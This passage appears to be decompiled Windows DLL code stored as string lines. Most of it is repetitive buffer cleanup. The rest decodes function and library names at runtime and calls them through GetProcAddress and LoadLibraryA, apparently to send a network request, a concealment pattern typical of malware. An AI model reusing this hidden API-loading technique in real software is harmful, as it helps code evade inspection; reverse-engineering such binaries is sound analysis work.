    "    v350 = 0;",
    "    v351 = 15;",
    "    LOBYTE(v349[0]) = 0;",
    "    if ( v348 > 7 )",
    "    {",
    "      v203 = v346[0];",
    "      v204 = 2 * v348 + 2;",
    "      if ( v204 >= 0x1000 )",
    "      {",
    "        v203 = (void *)*((_DWORD *)v346[0] - 1);",
    "        v204 = 2 * v348 + 37;",
    "        if ( (unsigned int)((char *)v346[0] - (char *)v203 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v204;",
    "      sub_100154EB(v203);",
    "    }",
    "    v347 = 0;",
    "    v348 = 7;",
    "    LOWORD(v346[0]) = 0;",
    "    if ( v357 <= 0xF )",
    "      goto LABEL_124;",
    "    v93 = v355[0];",
    "    v94 = (const CHAR *)(v357 + 1);",
    "    if ( v357 + 1 >= 0x1000 )",
    "    {",
    "      v93 = (void *)*((_DWORD *)v355[0] - 1);",
    "      v94 = (const CHAR *)(v357 + 36);",
    "      if ( (unsigned int)((char *)v355[0] - (char *)v93 - 4) > 0x1F )",
    "        goto LABEL_346;",
    "    }",
    "    goto LABEL_123;",
    "  }",
    "  v31 = v30(v276, v282, v277, 0, 0, 0, 0x800000, 0);",
    "  v32 = *this;",
    "  lpMultiByteStr = (LPCCH)v235;",
    "  v273 = (_DWORD **)v31;",
    "  v365 = -2080049408;",
    "  sub_10009E70(&v229, v32 + 138);",
    "  sub_1000B000(v235, v229, v230, v231, v232, v233, v234);",
    "  LOBYTE(v369) = 22;",
    "  sub_10009E70(&v229, *this + 438);",
    "  LOBYTE(v369) = 21;",
    "  sub_1000B970(",
    "    v328,",
    "    v229,",
    "    v230,",
    "    v231,",
    "    v232,",
    "    v233,",
    "    v234,",
    "    v235[0],",
    "    (int)v235[1],",
    "    (int)v235[2],",
    "    (int)v235[3],",
    "    (int)v236,",
    "    v237);",
    "  LOBYTE(v369) = 23;",
    "  v33 = v328;",
    "  if ( v330 > 0xF )",
    "    v33 = (void **)v328[0];",
    "  v34 = (void (__cdecl *)(_DWORD **, int, int *, int))((int (__cdecl *)(HMODULE, void **))ProcAddress)(hLibModule, v33);",
    "  if ( !v34 )",
    "  {",
    "LABEL_248:",
    "    if ( v330 > 0xF )",
    "    {",
    "      v161 = v328[0];",
    "      v162 = (_DWORD *)(v330 + 1);",
    "      if ( v330 + 1 >= 0x1000 )",
    "      {",
    "        v161 = (void *)*((_DWORD *)v328[0] - 1);",
    "        v162 = (_DWORD *)(v330 + 36);",
    "        if ( (unsigned int)((char *)v328[0] - (char *)v161 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v162;",
    "      sub_100154EB(v161);",
    "    }",
    "    LOBYTE(v328[0]) = 0;",
    "    v330 = 15;",
    "    v329 = 0;",
    "    if ( v363 > 0xF )",
    "    {",
    "      v163 = v361[0];",
    "      v164 = (_DWORD *)(v363 + 1);",
    "      if ( v363 + 1 >= 0x1000 )",
    "      {",
    "        v163 = (void *)*((_DWORD *)v361[0] - 1);",
    "        v164 = (_DWORD *)(v363 + 36);",
    "        if ( (unsigned int)((char *)v361[0] - (char *)v163 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v164;",
    "      sub_100154EB(v163);",
    "    }",
    "    LOBYTE(v361[0]) = 0;",
    "    v363 = 15;",
    "    v362 = 0;",
    "    if ( v360 > 0xF )",
    "    {",
    "      v165 = v358[0];",
    "      v166 = (_DWORD *)(v360 + 1);",
    "      if ( v360 + 1 >= 0x1000 )",
    "      {",
    "        v165 = (void *)*((_DWORD *)v358[0] - 1);",
    "        v166 = (_DWORD *)(v360 + 36);",
    "        if ( (unsigned int)((char *)v358[0] - (char *)v165 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v166;",
    "      sub_100154EB(v165);",
    "    }",
    "    LOBYTE(v358[0]) = 0;",
    "    v360 = 15;",
    "    v359 = 0;",
    "    if ( v333 > 0xF )",
    "    {",
    "      v167 = v331[0];",
    "      v168 = (_DWORD *)(v333 + 1);",
    "      if ( v333 + 1 >= 0x1000 )",
    "      {",
    "        v167 = (void *)*((_DWORD *)v331[0] - 1);",
    "        v168 = (_DWORD *)(v333 + 36);",
    "        if ( (unsigned int)((char *)v331[0] - (char *)v167 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v168;",
    "      sub_100154EB(v167);",
    "    }",
    "    LOBYTE(v331[0]) = 0;",
    "    v333 = 15;",
    "    v332 = 0;",
    "    if ( v336 > 0xF )",
    "    {",
    "      v169 = v334[0];",
    "      v170 = (_DWORD *)(v336 + 1);",
    "      if ( v336 + 1 >= 0x1000 )",
    "      {",
    "        v169 = (void *)*((_DWORD *)v334[0] - 1);",
    "        v170 = (_DWORD *)(v336 + 36);",
    "        if ( (unsigned int)((char *)v334[0] - (char *)v169 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v170;",
    "      sub_100154EB(v169);",
    "    }",
    "    LOBYTE(v334[0]) = 0;",
    "    v336 = 15;",
    "    v335 = 0;",
    "    if ( v339 > 0xF )",
    "    {",
    "      v171 = v337[0];",
    "      v172 = (_DWORD *)(v339 + 1);",
    "      if ( v339 + 1 >= 0x1000 )",
    "      {",
    "        v171 = (void *)*((_DWORD *)v337[0] - 1);",
    "        v172 = (_DWORD *)(v339 + 36);",
    "        if ( (unsigned int)((char *)v337[0] - (char *)v171 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v172;",
    "      sub_100154EB(v171);",
    "    }",
    "    LOBYTE(v337[0]) = 0;",
    "    v339 = 15;",
    "    v338 = 0;",
    "    if ( v345 > 0xF )",
    "    {",
    "      v173 = v343[0];",
    "      v174 = (_DWORD *)(v345 + 1);",
    "      if ( v345 + 1 >= 0x1000 )",
    "      {",
    "        v173 = (void *)*((_DWORD *)v343[0] - 1);",
    "        v174 = (_DWORD *)(v345 + 36);",
    "        if ( (unsigned int)((char *)v343[0] - (char *)v173 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v174;",
    "      sub_100154EB(v173);",
    "    }",
    "    LOBYTE(v343[0]) = 0;",
    "    v345 = 15;",
    "    v344 = 0;",
    "    if ( v354 > 0xF )",
    "    {",
    "      v175 = v352[0];",
    "      v176 = (_DWORD *)(v354 + 1);",
    "      if ( v354 + 1 >= 0x1000 )",
    "      {",
    "        v175 = (void *)*((_DWORD *)v352[0] - 1);",
    "        v176 = (_DWORD *)(v354 + 36);",
    "        if ( (unsigned int)((char *)v352[0] - (char *)v175 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v176;",
    "      sub_100154EB(v175);",
    "    }",
    "    LOBYTE(v352[0]) = 0;",
    "    v354 = 15;",
    "    v353 = 0;",
    "    if ( v342 > 0xF )",
    "    {",
    "      v177 = v340[0];",
    "      v178 = (_DWORD *)(v342 + 1);",
    "      if ( v342 + 1 >= 0x1000 )",
    "      {",
    "        v177 = (void *)*((_DWORD *)v340[0] - 1);",
    "        v178 = (_DWORD *)(v342 + 36);",
    "        if ( (unsigned int)((char *)v340[0] - (char *)v177 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v178;",
    "      sub_100154EB(v177);",
    "    }",
    "    LOBYTE(v340[0]) = 0;",
    "    v342 = 15;",
    "    v341 = 0;",
    "    if ( v351 > 0xF )",
    "    {",
    "      v179 = v349[0];",
    "      v180 = (_DWORD *)(v351 + 1);",
    "      if ( v351 + 1 >= 0x1000 )",
    "      {",
    "        v179 = (void *)*((_DWORD *)v349[0] - 1);",
    "        v180 = (_DWORD *)(v351 + 36);",
    "        if ( (unsigned int)((char *)v349[0] - (char *)v179 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v180;",
    "      sub_100154EB(v179);",
    "    }",
    "    LOBYTE(v349[0]) = 0;",
    "    v351 = 15;",
    "    v350 = 0;",
    "    if ( v348 > 7 )",
    "    {",
    "      v181 = v346[0];",
    "      v182 = (_DWORD *)(2 * v348 + 2);",
    "      if ( (unsigned int)v182 >= 0x1000 )",
    "      {",
    "        v181 = (void *)*((_DWORD *)v346[0] - 1);",
    "        v182 = (_DWORD *)(2 * v348 + 37);",
    "        if ( (unsigned int)((char *)v346[0] - (char *)v181 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v182;",
    "      sub_100154EB(v181);",
    "    }",
    "    LOWORD(v346[0]) = 0;",
    "    v348 = 7;",
    "    v347 = 0;",
    "    if ( v357 > 0xF )",
    "    {",
    "      v183 = v355[0];",
    "      v184 = (_DWORD *)(v357 + 1);",
    "      if ( v357 + 1 >= 0x1000 )",
    "      {",
    "        v183 = (void *)*((_DWORD *)v355[0] - 1);",
    "        v184 = (_DWORD *)(v357 + 36);",
    "        if ( (unsigned int)((char *)v355[0] - (char *)v183 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v184;",
    "      sub_100154EB(v183);",
    "    }",
    "    LOBYTE(v355[0]) = 0;",
    "    v357 = 15;",
    "    v356 = 0;",
    "    if ( v318 <= 7 )",
    "      return 0;",
    "    v95 = v317[0];",
    "    v96 = (const CHAR *)(2 * v318 + 2);",
    "    if ( (unsigned int)v96 < 0x1000 )",
    "      goto LABEL_299;",
    "    v95 = (void *)*((_DWORD *)v317[0] - 1);",
    "    v96 = (const CHAR *)(2 * v318 + 37);",
    "    if ( (unsigned int)((char *)v317[0] - (char *)v95 - 4) <= 0x1F )",
    "      goto LABEL_299;",
    "LABEL_346:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v34(v273, 31, &v365, 4);",
    "  v35 = 0;",
    "  v276 = 0;",
    "  if ( hObject )",
    "    v35 = strlen((const char *)hObject);",
    "  if ( v272 )",
    "    v276 = strlen((const char *)v272);",
    "  lpMultiByteStr = (LPCCH)&v229;",
    "  sub_10009E70(&v223, *v275 + 132);",
    "  sub_1000B000(&v229, (_DWORD *)v223, v224, (int)v225, (int)v226, v227, v228);",
    "  LOBYTE(v369) = 24;",
    "  sub_10009E70(&v223, *v275 + 432);",
    "  LOBYTE(v369) = 23;",
    "  sub_1000B970(v322, (_DWORD *)v223, v224, (int)v225, (int)v226, v227, v228, v229, v230, v231, v232, v233, v234);",
    "  LOBYTE(v369) = 25;",
    "  v36 = v322;",
    "  if ( v324 > 0xF )",
    "    v36 = (void **)v322[0];",
    "  v37 = (void (__cdecl *)(_DWORD **, HMODULE, int, HANDLE, unsigned int))((int (__cdecl *)(HMODULE, void **))ProcAddress)(",
    "                                                                           hLibModule,",
    "                                                                           v36);",
    "  if ( !v37 )",
    "  {",
    "LABEL_243:",
    "    if ( v324 > 0xF )",
    "    {",
    "      v159 = v322[0];",
    "      v160 = (_DWORD *)(v324 + 1);",
    "      if ( v324 + 1 >= 0x1000 )",
    "      {",
    "        v159 = (void *)*((_DWORD *)v322[0] - 1);",
    "        v160 = (_DWORD *)(v324 + 36);",
    "        if ( (unsigned int)((char *)v322[0] - (char *)v159 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v160;",
    "      sub_100154EB(v159);",
    "    }",
    "    v323 = 0;",
    "    v324 = 15;",
    "    LOBYTE(v322[0]) = 0;",
    "    goto LABEL_248;",
    "  }",
    "  v37(v273, v272, v276, hObject, v35);",
    "  v364 = 0;",
    "  hObject = 0;",
    "  if ( a2 == 1 )",
    "  {",
    "    lpMultiByteStr = (LPCCH)&v216;",
    "    sub_10009E70(&v211, *v275);",
    "    sub_1000B000(&v216, (_DWORD *)v211, SHIDWORD(v211), v212, (int)v213, v214, v215);",
    "    v38 = v275;",
    "    LOBYTE(v369) = 26;",
    "    sub_10009E70(&v211, *v275 + 312);",
    "    LOBYTE(v369) = 25;",
    "    sub_1000B970(&v222, (_DWORD *)v211, SHIDWORD(v211), v212, (int)v213, v214, v215, v216, v217, v218, v219, v220, v221);",
    "    sub_1000BA90(v299, v222, v223, v224, (int)v225, (size_t)v226, v227);",
    "    LOBYTE(v369) = 27;",
    "    sub_10009E70(&v222, *v38 + 324);",
    "    sub_1000B000(Src, v222, v223, v224, (int)v225, (unsigned int)v226, v227);",
    "    LOBYTE(v369) = 28;",
    "    if ( v300 == 0x7FFFFFFF )",
    "      sub_10001540();",
    "    v39 = v299;",
    "    v227 = 1;",
    "    if ( v301 > 0xF )",
    "      v39 = (void **)v299[0];",
    "    sub_1000A6C0(Block, (int)lpMultiByteStr, v300, v39, v300, \"\\\\\", v227);",
    "    LOBYTE(v369) = 29;",
    "    v40 = Src;",
    "    if ( v307 > 0xF )",
    "      v40 = (void **)Src[0];",
    "    v41 = Size;",
    "    v42 = (char *)v326[1];",
    "    v227 = Size;",
    "    v226 = v40;",
    "    if ( Size > v327 - (unsigned int)v326[1] )",
    "    {",
    "      LOBYTE(v282) = 0;",
    "      v45 = sub_1000A260(Block, Size, (int)v282, v226, v227);",
    "    }",
    "    else",
    "    {",
    "      v326[1] = (char *)v326[1] + Size;",
    "      v43 = Block;",
    "      if ( v327 > 0xF )",
    "        v43 = (void **)Block[0];",
    "      v44 = &v42[(_DWORD)v43];",
    "      memmove(&v42[(_DWORD)v43], v226, v227);",
    "      v44[v41] = 0;",
    "      v45 = Block;",
    "    }",
    "    v311 = 0;",
    "    *(_OWORD *)v310 = 0;",
    "    *(_OWORD *)v310 = *(_OWORD *)v45;",
    "    v311 = *((_QWORD *)v45 + 2);",
    "    v45[4] = 0;",
    "    v45[5] = (void *)15;",
    "    *(_BYTE *)v45 = 0;",
    "    LOBYTE(v369) = 31;",
    "    if ( v327 > 0xF )",
    "    {",
    "      v46 = Block[0];",
    "      v47 = (const CHAR *)(v327 + 1);",
    "      if ( v327 + 1 >= 0x1000 )",
    "      {",
    "        v46 = (void *)*((_DWORD *)Block[0] - 1);",
    "        v47 = (const CHAR *)(v327 + 36);",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v46 - 4) > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      v227 = (signed int)v47;",
    "      sub_100154EB(v46);",
    "    }",
    "    v326[1] = 0;",
    "    v327 = 15;",
    "    LOBYTE(Block[0]) = 0;",
    "    v48 = (_DWORD *)sub_10002FE0();",
    "    lpMultiByteStr = (LPCCH)&v222;",
    "    sub_10009E70(&v216, v48);",
    "    sub_1000B000(&v222, v216, v217, v218, v219, v220, v221);",
    "    LOBYTE(v369) = 32;",
    "    sub_10009E70(&v216, v48 + 186);",
    "    LOBYTE(v369) = 31;",
    "    sub_1000B970(lpLibFileName, v216, v217, v218, v219, v220, v221, v222, v223, v224, (int)v225, (int)v226, v227);",
    "    LOBYTE(v369) = 33;",
    "    sub_10009E70(&v222, lpLibFileName);",
    "    sub_1000AA30((int)lpModuleName, v222, v223, v224, (int)v225, (int)v226, v227);",
    "    LOBYTE(v369) = 34;",
    "    lpMultiByteStr = (LPCCH)&v222;",
    "    sub_10009E70(&v216, v48 + 6);",
    "    sub_1000B000(&v222, v216, v217, v218, v219, v220, v221);",
    "    LOBYTE(v369) = 35;",
    "    sub_10009E70(&v216, v48 + 192);",
    "    LOBYTE(v369) = 34;",
    "    sub_1000B970(lpProcName, v216, v217, v218, v219, v220, v221, v222, v223, v224, (int)v225, (int)v226, v227);",
    "    LOBYTE(v369) = 36;",
    "    v49 = (const WCHAR *)lpModuleName;",
    "    v50 = (const CHAR *)lpProcName;",
    "    if ( v294 > 7 )",
    "      v49 = lpModuleName[0];",
    "    if ( v296 > 0xF )",
    "      v50 = lpProcName[0];",
    "    v227 = (signed int)v50;",
    "    v51 = GetModuleHandleW(v49);",
    "    v52 = GetProcAddress(v51, (LPCSTR)v227);",
    "    v53 = (const CHAR *)lpLibFileName;",
    "    v277 = v52;",
    "    if ( v309 > 0xF )",
    "      v53 = lpLibFileName[0];",
    "    v282 = LoadLibraryA(v53);",
    "    lpMultiByteStr = (LPCCH)&v222;",
    "    sub_10009E70(&v216, v48 + 30);",
    "    sub_1000B000(&v222, v216, v217, v218, v219, v220, v221);",
    "    LOBYTE(v369) = 37;",
    "    sub_10009E70(&v216, v48 + 216);",
    "    LOBYTE(v369) = 36;",
    "    sub_1000B970(v297, v216, v217, v218, v219, v220, v221, v222, v223, v224, (int)v225, (int)v226, v227);",
    "    LOBYTE(v369) = 38;",
    "    v54 = v282;",
    "    if ( !v282 )",
    "    {",
    "      if ( v298 > 0xF )",
    "      {",
    "        v55 = v297[0];",
    "        v56 = (const CHAR *)(v298 + 1);",
    "        if ( v298 + 1 >= 0x1000 )",
    "        {",
    "          v55 = (void *)*((_DWORD *)v297[0] - 1);",
    "          v56 = (const CHAR *)(v298 + 36);",
    "          if ( (unsigned int)((char *)v297[0] - (char *)v55 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v56;",
    "        sub_100154EB(v55);",
    "      }",
    "      v297[4] = 0;",
    "      v298 = 15;",
    "      LOBYTE(v297[0]) = 0;",
    "      if ( v296 > 0xF )",
    "      {",
    "        v57 = (CHAR *)lpProcName[0];",
    "        v58 = (const CHAR *)(v296 + 1);",
    "        if ( v296 + 1 >= 0x1000 )",
    "        {",
    "          v57 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "          v58 = (const CHAR *)(v296 + 36);",
    "          if ( (unsigned int)(lpProcName[0] - (LPCSTR)v57 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v58;",
    "        sub_100154EB(v57);",
    "      }",
    "      lpProcName[4] = 0;",
    "      v296 = 15;",
    "      LOBYTE(lpProcName[0]) = 0;",
    "      if ( v294 > 7 )",
    "      {",
    "        v59 = (WCHAR *)lpModuleName[0];",
    "        v60 = (const CHAR *)(2 * v294 + 2);",
    "        if ( (unsigned int)v60 >= 0x1000 )",
    "        {",
    "          v59 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "          v60 = (const CHAR *)(2 * v294 + 37);",
    "          if ( (unsigned int)((char *)lpModuleName[0] - (char *)v59 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v60;",
    "        sub_100154EB(v59);",
    "      }",
    "      lpModuleName[4] = 0;",
    "      v294 = 7;",
    "      LOWORD(lpModuleName[0]) = 0;",
    "      if ( v309 > 0xF )",
    "      {",
    "        v61 = (CHAR *)lpLibFileName[0];",
    "        v62 = (const CHAR *)(v309 + 1);",
    "        if ( v309 + 1 >= 0x1000 )",
    "        {",
    "          v61 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "          v62 = (const CHAR *)(v309 + 36);",
    "          if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v61 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v62;",
    "        sub_100154EB(v61);",
    "      }",
    "      lpLibFileName[4] = 0;",
    "      v309 = 15;",
    "      LOBYTE(lpLibFileName[0]) = 0;",
    "      if ( HIDWORD(v311) > 0xF )",
    "      {",
    "        v63 = v310[0];",
    "        v64 = (const CHAR *)(HIDWORD(v311) + 1);",
    "        if ( (unsigned int)(HIDWORD(v311) + 1) >= 0x1000 )",
    "        {",
    "          v63 = (void *)*((_DWORD *)v310[0] - 1);",
    "          v64 = (const CHAR *)(HIDWORD(v311) + 36);",
    "          if ( (unsigned int)((char *)v310[0] - (char *)v63 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v64;",
    "        sub_100154EB(v63);",
    "      }",
    "      v311 = 0xF00000000LL;",
    "      LOBYTE(v310[0]) = 0;",
    "      if ( v307 > 0xF )",
    "      {",
    "        v65 = Src[0];",
    "        v66 = (const CHAR *)(v307 + 1);",
    "        if ( v307 + 1 >= 0x1000 )",
    "        {",
    "          v65 = (void *)*((_DWORD *)Src[0] - 1);",
    "          v66 = (const CHAR *)(v307 + 36);",
    "          if ( (unsigned int)((char *)Src[0] - (char *)v65 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v66;",
    "        sub_100154EB(v65);",
    "      }",
    "      Size = 0;",
    "      v307 = 15;",
    "      LOBYTE(Src[0]) = 0;",
    "      if ( v301 > 0xF )",
    "      {",
    "        v67 = v299[0];",
    "        v68 = (const CHAR *)(v301 + 1);",
    "        if ( v301 + 1 >= 0x1000 )",
    "        {",
    "          v67 = (void *)*((_DWORD *)v299[0] - 1);",
    "          v68 = (const CHAR *)(v301 + 36);",
    "          if ( (unsigned int)((char *)v299[0] - (char *)v67 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v68;",
    "        sub_100154EB(v67);",
    "      }",
    "      v300 = 0;",
    "      v301 = 15;",
    "      LOBYTE(v299[0]) = 0;",
    "      if ( v324 > 0xF )",
    "      {",
    "        v69 = v322[0];",
    "        v70 = (const CHAR *)(v324 + 1);",
    "        if ( v324 + 1 >= 0x1000 )",
    "        {",
    "          v69 = (void *)*((_DWORD *)v322[0] - 1);",
    "          v70 = (const CHAR *)(v324 + 36);",
    "          if ( (unsigned int)((char *)v322[0] - (char *)v69 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v70;",
    "        sub_100154EB(v69);",
    "      }",
    "      v323 = 0;",
    "      v324 = 15;",
    "      LOBYTE(v322[0]) = 0;",
    "      if ( v330 > 0xF )",
    "      {",
    "        v71 = v328[0];",
    "        v72 = (const CHAR *)(v330 + 1);",
    "        if ( v330 + 1 >= 0x1000 )",
    "        {",
    "          v71 = (void *)*((_DWORD *)v328[0] - 1);",
    "          v72 = (const CHAR *)(v330 + 36);",
    "          if ( (unsigned int)((char *)v328[0] - (char *)v71 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v72;",
    "        sub_100154EB(v71);",
    "      }",
    "      v329 = 0;",
    "      v330 = 15;",
    "      LOBYTE(v328[0]) = 0;",
    "      if ( v363 > 0xF )",
    "      {",
    "        v73 = v361[0];",
    "        v74 = (const CHAR *)(v363 + 1);",
    "        if ( v363 + 1 >= 0x1000 )",
    "        {",
    "          v73 = (void *)*((_DWORD *)v361[0] - 1);",
    "          v74 = (const CHAR *)(v363 + 36);",
    "          if ( (unsigned int)((char *)v361[0] - (char *)v73 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v74;",
    "        sub_100154EB(v73);",
    "      }",
    "      v362 = 0;",
    "      v363 = 15;",
    "      LOBYTE(v361[0]) = 0;",
    "      if ( v360 > 0xF )",
    "      {",
    "        v75 = v358[0];",
    "        v76 = (const CHAR *)(v360 + 1);",
    "        if ( v360 + 1 >= 0x1000 )",
    "        {",
    "          v75 = (void *)*((_DWORD *)v358[0] - 1);",
    "          v76 = (const CHAR *)(v360 + 36);",
    "          if ( (unsigned int)((char *)v358[0] - (char *)v75 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v76;",
    "        sub_100154EB(v75);",
    "      }",
    "      v359 = 0;",
    "      v360 = 15;",
    "      LOBYTE(v358[0]) = 0;",
    "      if ( v333 > 0xF )",
    "      {",
    "        v77 = v331[0];",
    "        v78 = (const CHAR *)(v333 + 1);",
    "        if ( v333 + 1 >= 0x1000 )",
    "        {",
    "          v77 = (void *)*((_DWORD *)v331[0] - 1);",
    "          v78 = (const CHAR *)(v333 + 36);",
    "          if ( (unsigned int)((char *)v331[0] - (char *)v77 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v78;",
    "        sub_100154EB(v77);",
    "      }",
    "      v332 = 0;",
    "      v333 = 15;",
    "      LOBYTE(v331[0]) = 0;",
    "      if ( v336 > 0xF )",
    "      {",
    "        v79 = v334[0];",
    "        v80 = (const CHAR *)(v336 + 1);",
    "        if ( v336 + 1 >= 0x1000 )",
    "        {",
    "          v79 = (void *)*((_DWORD *)v334[0] - 1);",
    "          v80 = (const CHAR *)(v336 + 36);",
    "          if ( (unsigned int)((char *)v334[0] - (char *)v79 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v80;",
    "        sub_100154EB(v79);",
    "      }",
    "      v335 = 0;",
    "      v336 = 15;",
    "      LOBYTE(v334[0]) = 0;",
    "      if ( v339 > 0xF )",
    "      {",
    "        v81 = v337[0];",
    "        v82 = (const CHAR *)(v339 + 1);",
    "        if ( v339 + 1 >= 0x1000 )",
    "        {",
    "          v81 = (void *)*((_DWORD *)v337[0] - 1);",
    "          v82 = (const CHAR *)(v339 + 36);",
    "          if ( (unsigned int)((char *)v337[0] - (char *)v81 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v82;",
    "        sub_100154EB(v81);",
    "      }",
    "      v338 = 0;",
    "      v339 = 15;",
    "      LOBYTE(v337[0]) = 0;",
    "      if ( v345 > 0xF )",
    "      {",
    "        v83 = v343[0];",
    "        v84 = (const CHAR *)(v345 + 1);",
    "        if ( v345 + 1 >= 0x1000 )",
    "        {",
    "          v83 = (void *)*((_DWORD *)v343[0] - 1);",
    "          v84 = (const CHAR *)(v345 + 36);",
    "          if ( (unsigned int)((char *)v343[0] - (char *)v83 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v84;",
    "        sub_100154EB(v83);",
    "      }",
    "      v344 = 0;",
    "      v345 = 15;",
    "      LOBYTE(v343[0]) = 0;",
    "      if ( v354 > 0xF )",
    "      {",
    "        v85 = v352[0];",
    "        v86 = (const CHAR *)(v354 + 1);",
    "        if ( v354 + 1 >= 0x1000 )",
    "        {",
    "          v85 = (void *)*((_DWORD *)v352[0] - 1);",
    "          v86 = (const CHAR *)(v354 + 36);",
    "          if ( (unsigned int)((char *)v352[0] - (char *)v85 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v86;",
    "        sub_100154EB(v85);",
    "      }",
    "      v353 = 0;",
    "      v354 = 15;",
    "      LOBYTE(v352[0]) = 0;",
    "      if ( v342 > 0xF )",
    "      {",
    "        v87 = v340[0];",
    "        v88 = (const CHAR *)(v342 + 1);",
    "        if ( v342 + 1 >= 0x1000 )",
    "        {",
    "          v87 = (void *)*((_DWORD *)v340[0] - 1);",
    "          v88 = (const CHAR *)(v342 + 36);",
    "          if ( (unsigned int)((char *)v340[0] - (char *)v87 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v88;",
    "        sub_100154EB(v87);",
    "      }",
    "      v341 = 0;",
    "      v342 = 15;",
    "      LOBYTE(v340[0]) = 0;",
    "      if ( v351 > 0xF )",
    "      {",
    "        v89 = v349[0];",
    "        v90 = (const CHAR *)(v351 + 1);",
    "        if ( v351 + 1 >= 0x1000 )",
    "        {",
    "          v89 = (void *)*((_DWORD *)v349[0] - 1);",
    "          v90 = (const CHAR *)(v351 + 36);",
    "          if ( (unsigned int)((char *)v349[0] - (char *)v89 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v90;",
    "        sub_100154EB(v89);",
    "      }",
    "      v350 = 0;",
    "      v351 = 15;",
    "      LOBYTE(v349[0]) = 0;",
    "      if ( v348 > 7 )",
    "      {",
    "        v91 = v346[0];",
    "        v92 = (const CHAR *)(2 * v348 + 2);",
    "        if ( (unsigned int)v92 >= 0x1000 )",
    "        {",
    "          v91 = (void *)*((_DWORD *)v346[0] - 1);",
    "          v92 = (const CHAR *)(2 * v348 + 37);",
    "          if ( (unsigned int)((char *)v346[0] - (char *)v91 - 4) > 0x1F )",
    "            goto LABEL_346;",
    "        }",
    "        v227 = (signed int)v92;",
    "        sub_100154EB(v91);",
    "      }",
    "      v347 = 0;",
    "      v348 = 7;",
    "      LOWORD(v346[0]) = 0;",
    "      if ( v357 <= 0xF )",
    "        goto LABEL_124;",
    "      v93 = v355[0];",
    "      v94 = (const CHAR *)(v357 + 1);",
    "      if ( v357 + 1 >= 0x1000 )",
    "      {",
    "        v93 = (void *)*((_DWORD *)v355[0] - 1);",
    "        v94 = (const CHAR *)(v357 + 36);",
    "        if ( (unsigned int)((char *)v355[0] - (char *)v93 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "LABEL_123:",
    "      v227 = (signed int)v94;",
    "      sub_100154EB(v93);",
    "LABEL_124:",
    "      v356 = 0;",
    "      v357 = 15;",
    "      LOBYTE(v355[0]) = 0;",
    "      if ( v318 <= 7 )",
    "        return 0;",
    "      v95 = v317[0];",
    "      v96 = (const CHAR *)(2 * v318 + 2);",
    "      if ( (unsigned int)v96 < 0x1000",
    "        || (v95 = (void *)*((_DWORD *)v317[0] - 1),",
    "            v96 = (const CHAR *)(2 * v318 + 37),",
    "            (unsigned int)((char *)v317[0] - (char *)v95 - 4) <= 0x1F) )",
    "      {",
    "LABEL_299:",
    "        v227 = (signed int)v96;",
    "        sub_100154EB(v95);",
    "        return 0;",
    "      }",
    "      goto LABEL_346;",
    "    }",
    "    v97 = v297;",
    "    if ( v298 > 0xF )",
    "      v97 = (void **)v297[0];",
    "    v98 = (int (__cdecl *)(_DWORD *))((int (__cdecl *)(HMODULE, void **))v277)(v282, v97);",
    "    v225 = 0;",
    "    if ( !v98 )",
    "    {",
    "      CloseHandle(v225);",
    "      FreeLibrary(v54);",
    "      sub_100017E0(v297);",
    "      sub_100017E0(lpProcName);",
    "      sub_10009D10(lpModuleName);",
    "      sub_100017E0(lpLibFileName);",
    "      sub_100017E0(v310);",
    "      sub_100017E0(Src);",
    "      v113 = v299;",
    "      goto LABEL_155;",
    "    }",
    "    v224 = 128;",
    "    v223 = 1;",
    "    v222 = 0;",
    "    v221 = 1;",
